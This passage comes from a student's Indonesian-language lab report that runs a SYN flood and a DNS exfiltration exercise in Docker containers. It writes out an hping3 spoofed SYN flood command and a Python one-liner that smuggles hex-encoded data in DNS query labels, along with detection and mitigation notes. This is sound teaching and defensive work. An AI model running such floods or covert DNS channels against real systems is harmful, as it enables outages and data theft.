$TARGET_IP = (docker compose -p k8 -f b/b3-syn-flood/docker-compose.yml exec target hostname -i).Trim()
$SPOOF_IP = ($TARGET_IP -replace '\.\d+$', '.99')
docker compose -p k8 -f b/b3-syn-flood/docker-compose.yml exec -d attacker timeout 15 hping3 -S -p 80 --flood --spoof $SPOOF_IP target
Start-Sleep -Seconds 2

# 3. Ukur lonjakan SYN_RECV saat serangan aktif (hasil: 158)
docker compose -p k8 -f b/b3-syn-flood/docker-compose.yml exec target awk '($4=="03"){c++} END{print c+0}' /proc/net/tcp /proc/net/tcp6

# 4. Tunggu serangan selesai, tangkap 3-Way Handshake normal, lalu bersihkan lab
Start-Sleep -Seconds 15
docker compose -p k8 -f b/b3-syn-flood/docker-compose.yml exec attacker sh -c 'timeout 10 tcpdump -i eth0 -nn tcp port 80 & sleep 1; (curl -s http://target || wget -qO- http://target) > /dev/null; sleep 10'
docker compose -p k8 -f b/b3-syn-flood/docker-compose.yml down -v
```

### Bukti

**Langkah 1 — jalankan lab B3 + SYN_RECV awal:**

![SYN_RECV awal](<Sreenshoot/Tugas 6/tugas6-01-syn-recv-awal-0.png>)

> Compose B3 menyalakan `k8-target-1` dan `k8-attacker-1`, lalu `awk` menghitung socket state `03` (`TCP_SYN_RECV`) di `/proc/net/tcp` + `/proc/net/tcp6` → hasil `0`, baseline sebelum serangan.

**Langkah 2 — bentuk IP spoof & jalankan flood:**

![jalankan SYN flood](<Sreenshoot/Tugas 6/tugas6-02-jalankan-syn-flood-spoof.png>)

> `$TARGET_IP` diambil via `hostname -i`, lalu diubah menjadi `$SPOOF_IP` (oktet terakhir `.99`, mis. `172.19.0.99`); `hping3 -S -p 80 --flood --spoof $SPOOF_IP target` berjalan 15 detik di background.

**Langkah 3 — SYN_RECV saat serangan:**

![SYN_RECV saat serangan](<Sreenshoot/Tugas 6/tugas6-03-syn-recv-saat-serangan-158.png>)

> Perintah hitung yang sama kini mengembalikan `158` — antrean half-open target terisi SYN yang tidak pernah diselesaikan (dari 0 → 158).

> Catatan: nilai yang terekam pada screenshot adalah **158**, bukan 140 seperti pada
> catatan awal pengerjaan; laporan ini memakai angka yang benar-benar tampak di bukti
> (juga sesuai nama file `…-158.png`). Angka ini bergerak bergantung pada waktu
> pengukuran dan bagaimana kernel membuang entry kedaluwarsa.

**Langkah 4 — tcpdump 3-way handshake + bersihkan:**

![tcpdump handshake](<Sreenshoot/Tugas 6/tugas6-04-tcpdump-three-way-handshake.png>)

> Di tengah sisa flood, `tcpdump` menangkap `Flags [S]` (SYN, seq 3884537482) dari `172.19.0.3` → `172.19.0.2:80`, dibalas `Flags [S.]` (SYN-ACK, seq 2679048366, ack 3884537483), lalu `Flags [.]` (ACK) — 12 paket terekam sampai `GET / HTTP/1.1` → `200 OK` dan FIN. Compose lalu dibawa turun dengan `down -v`.

### Penjelasan

Three-way handshake: **SYN** (client meminta koneksi, membawa ISN), **SYN-ACK**
(server menyetujui, membuka port, menyimpan state koneksi di **SYN queue** dengan
status `SYN_RECV`), lalu **ACK** (client mengonfirmasi). Bukti `tcpdump` memperlihatkan
ketiganya berurutan sebagai `Flags [S]`, `Flags [S.]`, `Flags [.]`, lengkap dengan
seq/ack yang saling terkait (ack SYN-ACK = seq SYN + 1).

Kerentanannya ada di celah antara SYN dan ACK: server harus menyimpan state untuk
client yang belum membuktikan keberadaannya. SYN flood mengirim ribuan SYN dengan
**source spoofed**, sehingga server mengalokasikan entri `SYN_RECV` dan mengirim
SYN-ACK ke alamat palsu yang tidak akan pernah membalas. Antrean penuh → SYN dari
client sah dibuang → layanan tidak tersedia (availability) tanpa perlu exploit atau
kredensial. Inilah sebabnya jumlah `SYN_RECV` dipakai sebagai indikator: pada lab ini
0 → 158.

Dua detail penting dari percobaan Windows/Docker ini:

- **Tanpa spoof, `SYN_RECV` tetap 0.** Kernel attacker menerima SYN-ACK lalu langsung
  mengirim `RST` karena tidak ada socket yang menunggu, sehingga entri di target cepat
  dibersihkan. `--rand-source` juga gagal karena Docker membuang paket dengan source
  di luar subnet container.
- **Spoof harus satu subnet** (`--spoof 172.19.0.99`, target `172.19.0.2`). Dengan
  begitu SYN-ACK tetap bisa dikirim keluar bridge, tetapi tidak ada host yang memilikinya
  untuk membalas `RST`, sehingga entri `SYN_RECV` bertahan dan menumpuk.

Mitigasi: **SYN cookies** (`net.ipv4.tcp_syncookies=1`) — state koneksi dikodekan ke
dalam sequence number SYN-ACK sehingga TCB baru dibuat hanya saat ACK final tiba dan
antrean tidak bisa ditumpuk; ditambah tuning `tcp_max_syn_backlog`/`somaxconn`,
rate-limit SYN per source (iptables `hashlimit`/`synproxy`), deteksi spike
`SYN_RECV`, serta **uRPF/BCP 38** agar paket ber-source palsu tidak masuk jaringan.

---

## Tugas 7 (Pertemuan 7): DNS Exfiltration

### Urutan langkah

1. Jalankan compose B4 (`dns` dnsmasq + `attacker`).
2. Encode NIM menjadi hex dan kirim sebagai label subdomain query DNS lewat socket
   UDP Python.
   → `Sreenshoot/Tugas 7/tugas7-01-encode-nim-hex-kirim-dns-query.png`
3. Simpan log resolver (`--no-log-prefix`, ASCII), tampilkan, lalu jalankan
   `analisis_dns.py`.
   → `Sreenshoot/Tugas 7/tugas7-02-log-dnsmasq-dan-analisis-dns-exfil.png`
4. Decode label hex kembali ke NIM asli *(belum terekam di screenshot)*.
5. Bawa turun compose (`down -v`).
   → `Sreenshoot/Tugas 7/tugas7-03-compose-down.png`

### Command

```powershell
# 1. Jalankan lab DNS exfiltration
docker compose -p k8 -f b/b4-dns-exfil/docker-compose.yml up -d

# 2. Encode NIM ke Hex & kirim paket query DNS via Python UDP socket
$HEX = ([System.Text.Encoding]::UTF8.GetBytes("24552011350") | ForEach-Object { $_.ToString("x2") }) -join ""
Write-Output "Hex NIM: $HEX"
docker compose -p k8 -f b/b4-dns-exfil/docker-compose.yml exec attacker python3 -c "import socket; h='$HEX'.encode(); pkt=b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'+bytes([len(h)])+h+b'\x02k8\x05exfil\x03lab\x00\x00\x01\x00\x01'; s=socket.socket(2,2); s.sendto(pkt,('dns',53))"

# 3. Simpan log ASCII tanpa prefiks, analisis dengan skrip Python, dan decode kembali ke NIM asli
docker compose -p k8 -f b/b4-dns-exfil/docker-compose.yml logs --no-log-prefix dns | Set-Content -Path dns-k8.log -Encoding Ascii
Get-Content dns-k8.log
$DETEKTOR = (Get-ChildItem -Path kasus -Recurse -Filter analisis_dns.py | Select-Object -First 1).FullName
python $DETEKTOR dns-k8.log
[System.Text.Encoding]::UTF8.GetString([byte[]] -split ($HEX -replace '..', '0x$& '))

# 4. Bersihkan lab Tugas 7
docker compose -p k8 -f b/b4-dns-exfil/docker-compose.yml down -v
```

> Catatan: `analisis_dns.py` adalah **skrip detektor bersama** yang disimpan di salah
> satu subfolder `kasus\`, jadi perintah di atas mencarinya otomatis dengan
> `Get-ChildItem` agar tidak bergantung pada nama folder tertentu. Detektornya menandai
> label dengan `len(label) > 30` **dan** seluruhnya cocok regex hex.

### Bukti

**Langkah 2 — encode jadi hex & kirim query:**

![encode hex dan kirim query](<Sreenshoot/Tugas 7/tugas7-01-encode-nim-hex-kirim-dns-query.png>)

> NIM `24552011350` diubah menjadi hex `3234353532303131333530` (22 karakter) lewat `.NET`, lalu dibungkus menjadi paket DNS query untuk `…k8.exfil.lab` (ID `0x1234`, `QCLASS IN`, `QTYPE A`) dan dikirim ke `dns:53` via UDP.

**Langkah 3 — log dnsmasq + deteksi:**

![log dan deteksi](<Sreenshoot/Tugas 7/tugas7-02-log-dnsmasq-dan-analisis-dns-exfil.png>)

> Log resolver memuat `query[A] 3234353532303131333530.k8.exfil.lab from 172.19.0.2` dan `config … is 10.0.0.99` (jawaban wildcard). `analisis_dns.py` melaporkan `exfil.lab: 1`, tetapi daftar **"Query mencurigakan" kosong** — karena label hex NIM hanya 22 karakter, di bawah ambang `> 30`. Pada sesi ini skrip detektor dipanggil dengan path eksplisit ke folder bersamanya.

**Langkah 4 — decode balik:**

> Tidak ada file screenshot untuk langkah ini. Perintah decode di atas mengembalikan
> `24552011350` (hex → byte → string UTF-8), sehingga data terbukti bisa
> direkonstruksi penuh hanya dari label DNS.

**Langkah 5 — bersihkan lab:**

![bersihkan](<Sreenshoot/Tugas 7/tugas7-03-compose-down.png>)

> `down -v` menghapus `k8-attacker-1`, `k8-dns-1`, dan network `k8_lab` — tidak ada sisa container.

### Penjelasan

Data di-encode menjadi hex lalu ditempel sebagai **label paling kiri** pada nama yang
di-resolve (`3234353532303131333530.k8.exfil.lab`). Resolver mencatat query itu, dan
pihak penerima (di sini: pemilik domain `exfil.lab`) cukup membaca log query untuk
mendapatkan datanya kembali. Karena setiap karakter NIM menjadi dua karakter hex,
NIM 11 digit menghasilkan label 22 karakter — masih jauh di bawah batas satu label
DNS (63 karakter) dan total nama (253 karakter). Teknik ini sulit diblokir firewall
biasa karena resolusi nama adalah prasyarat hampir semua trafik: memblokir DNS berarti
mematikan hampir seluruh layanan, sehingga DNS menjadi **covert channel** yang selalu
terbuka. Pada lab, resolver juga memakai `--address=/exfil.lab/10.0.0.99`, jadi semua
query di bawah `exfil.lab` dijawab `10.0.0.99` — tidak ada NXDOMAIN, yang justru
membuat exfil makin "normal" dan sulit dibedakan dari trafik sah.

**Mengapa detektornya kosong di sini (dan mengapa itu pelajaran penting):**
detektor menandai label `> 30` karakter yang seluruhnya hex. Label 22 karakter lolos
begitu saja — **false negative**. Exfiltration nyata tidak mengirim satu NIM; ia
memecah file menjadi banyak chunk (mis. 40–60 karakter hex per label) dengan nomor
urut di label berikutnya, misalnya `…chunk07.k8.exfil.lab`, lalu merangkainya di sisi
penerima. Karena satu label maksimal 63 karakter, data besar butuh banyak query
berurutan. Indikator deteksi yang lebih kuat: **panjang dan entropi label** yang tidak
wajar, jumlah subdomain unik per domain induk yang melonjak, pola base32/base64/hex,
tipe record TXT yang mencurigakan, spike NXDOMAIN (pada resolver tanpa wildcard), dan
volume query per host. Mitigasi: paksa semua DNS lewat resolver internal terkontrol
(blokir UDP/TCP 53 keluar), **Response Policy Zones (RPZ)**, monitoring/analitik query,
restrict egress, serta allowlist domain. Perlu diingat DNSSEC hanya menjamin
integritas/keaslian jawaban, **bukan** kerahasiaan isi query — ia tidak mencegah
exfiltration.

---

## Kesimpulan

Saya telah menyelesaikan semua 7 tugas dengan output dan penjelasan yang diminta:
volume persisten `vol-k8` yang bertahan setelah container dihapus dan jaringan compose
`internal: true`; enkripsi AES-256-CBC + PBKDF2 dengan dua hash SHA-256 identik serta
sertifikat self-signed `CN=k8.uts.local`; ARP spoofing yang mengubah MAC gateway
`8e:07:96:68:99:68` → `26:fe:12:7a:10:e4` lalu pulih ke MAC asli dengan `Flags 0x6`
setelah mitigasi static ARP; analisis 4-way handshake WPA2; ICMP echo reply `TTL 64 /
type 0`; SYN flood dengan `SYN_RECV` 0 → 158 dan tangkapan `[S] → [S.] → [.]`; serta
DNS exfiltration NIM `24552011350` → `3234353532303131333530`.
